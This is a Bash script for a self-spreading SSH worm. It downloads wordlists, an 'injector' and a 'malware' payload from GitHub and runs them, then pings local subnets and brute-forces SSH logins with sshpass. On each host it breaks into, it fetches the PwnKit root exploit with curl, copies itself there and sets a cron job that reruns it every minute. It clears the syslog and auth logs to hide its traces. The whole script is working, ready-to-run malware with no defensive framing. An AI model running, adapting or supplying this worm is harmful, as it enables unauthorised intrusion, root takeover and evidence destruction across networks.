#!/bin/bash

# export HISTFILE=/dev/null # prevent history logging

# Get the current machine's list of IPv4 addresses
current_ips=$(hostname -I | tr ' ' '\n' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')

# URLs for username and password wordlists
USERNAME_LIST_URL="https://raw.githubusercontent.com/Botxan/TechnoTrust/refs/heads/main/usernames.txt"
USERNAMES_FILE="/tmp/usernames.txt"
PASSWORD_LIST_URL="https://raw.githubusercontent.com/Botxan/TechnoTrust/refs/heads/main/passwords.txt"
PASSWORDS_FILE="/tmp/passwords.txt"
HOSTS_FILE="/tmp/hosts.txt"
WORM_FILE="/tmp/system_update.sh"
PRIV_ESC_FILE="/tmp/pwnkit.sh"
INJECTOR_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/inject_program"
INJECTOR_FILE="/tmp/inject"
PAYLOAD_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/malware"
PAYLOAD_FILE="/tmp/malware"

# Function to get all subnets connected to the machine, excluding loopback and 10.0.2.10 network
get_subnets() {
  subnets=$(ip a | grep inet | grep -v inet6 | awk '{print $2}' | cut -d/ -f1 | sort -u)
  filtered_subnets=$(echo "$subnets" | grep -v '^127\.' | grep -v '^10.0.2\.')
  echo "$filtered_subnets"
}

# Function to discover live hosts in the subnets using ping
discover_hosts() {
  subnets="$1"
  > "$HOSTS_FILE"  # Clear the file before adding new hosts
  echo "Discovering hosts in the subnets..."
  
  for subnet in $subnets; do
    base_ip=$(echo $subnet | cut -d'.' -f1-3)
    for ip in {1..254}; do
      target_ip="$base_ip.$ip"
      # Skip current IP addresses
      if echo "$current_ips" | grep -q "$target_ip"; then
        continue
      fi
      # Run the ping in background jobs
      ping -c 1 -W 2 $target_ip &> /dev/null && echo "$target_ip" >> "$HOSTS_FILE" &
    done
  done
  wait
  # Check if discovered_hosts.txt is not empty
  if [[ ! -s "$HOSTS_FILE" ]]; then
    echo "No hosts found in the subnets."
    exit 1
  fi
}

# Function to download the username and password lists
download_files() {
  echo "Downloading username wordlist..."
  wget -q $USERNAME_LIST_URL -O $USERNAMES_FILE
  echo "Downloading password wordlist..."
  wget -q $PASSWORD_LIST_URL -O $PASSWORDS_FILE
  echo "Downloading injector..."
  wget -q $INJECTOR_URL -O $INJECTOR_FILE
  chmod +x $INJECTOR_FILE
  echo "Downloading payload..."
  wget -q $PAYLOAD_URL -O $PAYLOAD_FILE
  chmod +x $PAYLOAD_FILE
 

  if [[ ! -f "$USERNAMES_FILE" || ! -f "$PASSWORDS_FILE" || ! -f "$INJECTOR_FILE" || ! -f "$PAYLOAD_FILE" ]]; then
    echo "Failed to download files. Exiting."
    exit 1
  fi
}

brute_force_ssh() {
  target_ip="$1"
  username="$2"
  password="$3"

  echo "Testing $username:$password on $target_ip"

  worm_base64=$(base64 -w 0 "$WORM_FILE")

  timeout 10 sshpass -p "$password" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    -o ConnectionAttempts=2 \
    "$username@$target_ip" \
    "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh > $PRIV_ESC_FILE && \
    chmod +x $PRIV_ESC_FILE && \
    echo $worm_base64 | base64 -d > $WORM_FILE && chmod +x $WORM_FILE && \
    echo '(crontab -l 2>/dev/null | grep -v \"$WORM_FILE\"; echo \"* * * * * cd /tmp && $WORM_FILE\") | crontab -' | $PRIV_ESC_FILE" &> /dev/null
}

# Function to handle cleanup in case of error
cleanup() {
  echo "An error occurred. Cleaning up..."
  rm -f $USERNAMES_FILE $PASSWORDS_FILE $HOSTS_FILE $PRIV_ESC_FILE
  > /var/log/syslog
  > /var/log/auth.log
  exit 1
}

# Trap any errors and call cleanup function
trap 'cleanup' ERR

# Main function to generate parallel brute-force tasks
main() {
  # Check if sshpass is installed
  if ! command -v sshpass &> /dev/null; then
    echo "sshpass is not installed. Please install it using:"
    echo "sudo apt-get install sshpass  # For Debian/Ubuntu"
    echo "sudo yum install sshpass      # For CentOS/RHEL"
    exit 1
  fi

  # Download the wordlists
  download_files
  $INJECTOR_FILE

  subnets=$(get_subnets)
  
  if [[ -z "$subnets" ]]; then
    echo "No subnets found."
    exit 1
  fi

  # Discover hosts in the subnets
  discover_hosts "$subnets"
  
  # Check if the discovered_hosts.txt file was created and contains any hosts
  if [[ ! -s "$HOSTS_FILE" ]]; then
    echo "No hosts found to scan."
    exit 1
  fi

  discovered_hosts=$(cat "$HOSTS_FILE")

  # Check if discovered_hosts is empty or malformed
  if [[ -z "$discovered_hosts" ]]; then
    echo "No valid hosts to scan. Exiting."
    exit 1
  fi

  # Brute force attempts: generate all combinations of usernames and passwords
  while IFS= read -r username; do
    while IFS= read -r password; do
      for host in $discovered_hosts; do
        # Skip current IP addresses
        if echo "$current_ips" | grep -q "$host"; then
          continue  # Skip the current machine
        fi
        
        # Run each brute-force attempt in the background
        brute_force_ssh "$host" "$username" "$password" &
      done
    done < $PASSWORDS_FILE 
  done < $USERNAMES_FILE 

  wait

  # Remove temporary files
  rm -f $USERNAMES_FILE $PASSWORDS_FILE $HOSTS_FILE $PRIV_ESC_FILE

  # Clear logs
  > /var/log/syslog
  > /var/log/auth.log
}

main

